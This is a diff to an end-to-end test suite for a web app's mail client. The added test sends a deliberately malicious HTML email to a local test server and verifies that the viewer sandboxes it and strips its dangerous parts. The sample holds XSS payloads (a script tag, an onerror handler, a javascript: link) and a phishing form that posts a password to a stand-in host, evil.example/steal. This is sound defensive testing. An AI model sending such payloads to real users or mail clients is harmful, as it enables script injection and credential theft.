@@ -89,6 +89,32 @@ async function openPage(cdp, name, auth) {
   return p;
 }
 
+// smtpSend — письмо напрямую по SMTP (тестовый сервер mailtest: AUTH PLAIN username/password, без TLS).
+async function smtpSend(port, from, to, data) {
+  const { connect } = await import('node:net');
+  const sock = connect(port, '127.0.0.1');
+  let buf = '';
+  const waitCode = () => new Promise((res, rej) => {
+    const t = setTimeout(() => rej(new Error('SMTP: нет ответа')), 5000);
+    const on = () => {
+      const lines = buf.split('\r\n');
+      const last = lines.findIndex(l => /^\d{3} /.test(l)); // последняя строка ответа: «250 …» (не «250-…»)
+      if (last >= 0) { const code = +lines[last].slice(0, 3); buf = lines.slice(last + 1).join('\r\n'); clearTimeout(t); sock.off('data', h); res(code); }
+    };
+    const h = d => { buf += d.toString(); on(); };
+    sock.on('data', h); on();
+  });
+  const cmd = async (line, want) => { sock.write(line + '\r\n'); const c = await waitCode(); if (c !== want) throw new Error(`SMTP ${line.split(' ')[0]}: ${c}`); };
+  if (await waitCode() !== 220) throw new Error('SMTP: нет приветствия');
+  await cmd('EHLO test', 250);
+  await cmd('AUTH PLAIN ' + Buffer.from('\0username\0password').toString('base64'), 235);
+  await cmd(`MAIL FROM:<${from}>`, 250);
+  await cmd(`RCPT TO:<${to}>`, 250);
+  await cmd('DATA', 354);
+  await cmd(data.replace(/\r\n\./g, '\r\n..') + '\r\n.', 250);
+  sock.end('QUIT\r\n');
+}
+
 async function api(method, path, auth, body) {
   const r = await fetch(B + path, { method, headers: { Authorization: auth, 'Content-Type': 'application/json' }, body: body && JSON.stringify(body) });
   const t = await r.text();
@@ -173,6 +199,32 @@ try {
   await A.eval('Call.hangup()');
   check(await A.waitFor(`!document.querySelector('.call') && [...document.querySelectorAll('.talk-sys')].some(e => e.textContent.startsWith('Звонок завершён'))`, 10000),
     'звонок завершён, в переписке есть запись о нём');
+
+  // ---------- почта: вредоносное HTML-письмо (если запущен тестовый почтовый сервер) ----------
+  if (process.env.MAILTEST_SMTP) {
+    const smtpPort = +process.env.MAILTEST_SMTP, imapPort = +(process.env.MAILTEST_IMAP || 1143);
+    const evil = '<p id="hello">Здравствуйте!</p><script>parent.__pwned = 1</script>' +
+      '<img src="x" onerror="parent.__pwned = 2"><a href="javascript:parent.__pwned=3">ссылка</a>' +
+      '<form action="https://evil.example/steal"><input name="password"><button>Войти</button></form>' +
+      '<img src="https://tracker.example/pixel.gif">';
+    await smtpSend(smtpPort, 'evil@example.org', 'ana@example.org',
+      'From: Злоумышленник <evil@example.org>\r\nTo: ana@example.org\r\nSubject: Проверка безопасности\r\n' +
+      'MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n' + evil + '\r\n');
+    const acc = await A.eval(`api('POST', '/api/mail/accounts', { email: 'ana@example.org', login: 'username', password: 'password',
+      imap_host: '127.0.0.1', imap_port: ${imapPort}, imap_sec: 'none', smtp_host: '127.0.0.1', smtp_port: ${smtpPort}, smtp_sec: 'none' }).then(a => a.id)`);
+    check(!!acc, 'почта: ящик подключён из браузера');
+    await A.eval(`location.hash = '#/mail'`);
+    check(await A.waitFor(`[...document.querySelectorAll('.mail-row .subj')].some(e => e.textContent === 'Проверка безопасности')`, 15000), 'почта: письмо в списке');
+    await A.eval(`[...document.querySelectorAll('.mail-row')].find(r => r.textContent.includes('Проверка безопасности')).click()`);
+    check(await A.waitFor(`!!document.querySelector('iframe.mail-frame')`, 15000), 'почта: письмо открыто в iframe');
+    const fr = await A.eval(`(() => { const f = document.querySelector('iframe.mail-frame'); return { sandbox: f.getAttribute('sandbox'), doc: f.srcdoc }; })()`);
+    check(!/allow-scripts|allow-same-origin/.test(fr.sandbox), 'почта: iframe без скриптов и без доступа к CloudBox (sandbox: ' + fr.sandbox + ')');
+    check(fr.doc.includes('Здравствуйте!') && !/<script|onerror|javascript:|<form|<input/i.test(fr.doc), 'почта: скрипты, обработчики, javascript:-ссылки и формы вырезаны');
+    check(/img-src data:;/.test(fr.doc) && !!(await A.eval(`!!document.querySelector('.mail-banner')`)), 'почта: картинки из интернета заблокированы, показано предупреждение');
+    await sleep(1000);
+    check(await A.eval('window.__pwned === undefined'), 'почта: код из письма не выполнился в CloudBox');
+    await A.eval(`api('DELETE', '/api/mail/accounts/${acc}')`);
+  }
 
   check(A.errors.length === 0 && Bp.errors.length === 0, 'без ошибок JavaScript' + (A.errors.length + Bp.errors.length ? ': ' + [...A.errors, ...Bp.errors].join(' | ') : ''));
 } catch (e) {
